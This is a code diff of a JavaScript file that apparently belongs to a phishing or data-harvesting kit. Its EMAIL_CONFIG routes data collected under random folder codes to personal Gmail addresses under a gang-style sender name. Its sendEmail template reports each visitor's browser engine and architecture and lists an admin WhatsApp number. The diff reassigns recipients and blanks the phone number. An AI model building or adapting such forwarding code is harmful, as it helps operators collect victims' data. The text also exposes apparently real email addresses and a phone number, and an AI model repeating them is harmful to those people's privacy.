@@ -23,13 +23,13 @@ const EMAIL_CONFIG = {
         subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗚𝗦𝗧 𝗗𝗜𝗩𝗜𝗦𝗜𝗢𝗡'
     },
     'ggwxzzr': {
-        email: ['chilligemaass@gmail.com', 'Bay20110809@gmail.com'],
+        email: ['Bay20110809@gmail.com'],
         fromName: 'WHEN YA PERDETIK🔥👾',
         subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗚𝗦𝗧 𝗗𝗜𝗩𝗜𝗦𝗜𝗢𝗡'
     },
     'hgefdyt': {
-        email: ['nebarzam@gmail.com', 'chilligemaass@gmail.com'],
-        fromName: '👻WHEN YA PERDETIK👻',
+        email: ['nebarzam@gmail.com'],
+        fromName: 'WHEN YA PERDETIK🔥👾',
         subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗚𝗦𝗧 𝗗𝗜𝗩𝗜𝗦𝗜𝗢𝗡'
     },
     'mgwhiww': {
@@ -471,7 +471,7 @@ async function sendEmail(data, folderName) {
         <tr><td class="label">Engine</td><td class="value">${engine}</td></tr>
         <tr><td class="label">Arch</td><td class="value">${arch}</td></tr>
     </table>
-    <div class="footer-sign">©Nomor Whatsapp Admin Web -> 0819-7763-9470</div>
+    <div class="footer-sign">©Nomor Whatsapp Admin Web -> +1???????????</div>
 </div>
 </body>
 </html>`;
